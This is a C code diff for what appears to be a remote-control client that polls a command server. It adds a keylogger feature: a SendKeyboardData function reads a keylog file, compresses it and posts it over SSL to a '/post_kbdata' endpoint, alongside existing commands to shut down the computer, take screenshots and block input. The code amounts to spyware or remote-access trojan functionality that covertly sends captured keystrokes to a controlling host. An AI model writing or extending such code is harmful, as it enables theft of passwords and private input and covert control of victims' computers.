@@ -10,6 +10,8 @@
 #include "formatter.h"
 #include "myzip.h"
 #include "thutil.h"
+#include "keyboard_hook.h"
+#include "file_util.h"
 #include <cJSON.h>
 #include <string.h>
 #include <stdlib.h>
@@ -40,12 +42,13 @@
 #define HTTP_NOT_MODIFIED   304
 #define HTTP_INTERNAL       500
 #define HTTP_NOT_FOUND      404
-
+#define HTTP_NO_CONTENT     204
 
 
 #define CMD_TURNOFF_COMP    0
 #define CMD_TAKESCREEN      1
 #define CMD_BLOCKINPUT      2
+#define CMD_KB              3
 
 #define     CMD_STATUS_PENDING      88  // remote control say that he wants to perform command
 #define     CMD_STATUS_READYEXECUTE 89  // client is need to execute
@@ -437,6 +440,63 @@ done:
     return code;
 }
 
+int SendKeyboardData()
+{
+    HttpClient * http = NULL;
+    fbuf_ptr buffer = NULL;
+    char * endpoint = NULL;
+    char * encoded = NULL;
+    int sc;
+    uint32_t encoded_size;
+    poll_code_t code = POLL_FAILED;
+    
+    // reading keylog file
+    buffer = ReadKeylog();
+
+    if (!buffer) {
+        goto done;
+    }
+
+    http = NewSSLClient();
+
+    if (!http) {
+        goto done;
+    }
+
+
+    encoded = encode_deflate(buffer->data, buffer->bytes, &encoded_size, Z_BALANCE);
+
+    if (!encoded) {
+        goto done;
+    }
+
+    HttpClientSetDataSent(http, encoded, encoded_size, false);
+    
+    endpoint = create_endpoint("/post_kbdata");
+    
+    if (!endpoint) {
+        goto done;
+    }
+
+    HttpClientSetUrl(http, endpoint);
+    HttpClientPerform(http);
+
+    sc = HttpClientGetResponseCode(http);
+
+    if (sc != HTTP_NO_CONTENT) {
+        goto done;
+    }
+
+    code = POLL_SUCCESS;
+
+done:
+    fbuf_free(buffer);
+    HttpClientFree(http);
+    free(endpoint);
+    free(encoded);
+    return code;
+}
+
 poll_code_t do_poll(HttpClient * const http_client, const char * uri, int cmd)
 {
     poll_code_t code = POLL_FAILED;
@@ -479,6 +539,15 @@ poll_code_t do_poll(HttpClient * const http_client, const char * uri, int cmd)
             case CMD_TURNOFF_COMP:
             {
                 TurnComputerOffWin32();
+                break;
+            }
+            case CMD_KB:
+            {
+                if (SendKeyboardData() == POLL_FAILED) {
+                    printf("failed to send keyboard data ...\n");
+                } else {
+                    printf("keyboard data was sent to server!\n");
+                }
                 break;
             }
         }
@@ -524,22 +593,24 @@ int PollAboutCommand(void * arg)
     char * url_turnoff = NULL;
     char * url_take_screen = NULL;
     char * url_block_input = NULL;
+    char * url_sendkb       = NULL;
 
     boolean error_occured = false;
     poll_code_t err_code = POLL_SUCCESS;
 
 
     http_client = NewSSLClient();
-    url_turnoff = StringFmt("%s/poll_about_command/%dz", BASE_ADDR(),      CMD_TURNOFF_COMP);
-    url_take_screen = StringFmt("%s/poll_about_command/%dz", BASE_ADDR(),  CMD_TAKESCREEN);
-    url_block_input = StringFmt("%s/poll_about_command/%dz", BASE_ADDR(),   CMD_BLOCKINPUT);
-    
+    url_turnoff =     create_endpoint("/poll_about_command/%dz", CMD_TURNOFF_COMP);
+    url_take_screen = create_endpoint("/poll_about_command/%dz", CMD_TAKESCREEN);
+    url_block_input = create_endpoint("/poll_about_command/%dz", CMD_BLOCKINPUT);
+    url_sendkb      = create_endpoint("/poll_about_command/%dz", CMD_KB);
 
     while (!error_occured)
     {
         err_code = do_poll(http_client, url_turnoff, CMD_TURNOFF_COMP);
         err_code = do_poll(http_client, url_block_input, CMD_BLOCKINPUT);
         err_code = do_poll(http_client, url_take_screen, CMD_TAKESCREEN);
+        err_code = do_poll(http_client, url_sendkb, CMD_KB);
         ThreadSleepSeconds(SLEEP_SECONDS_DEFAULT);
     }
 
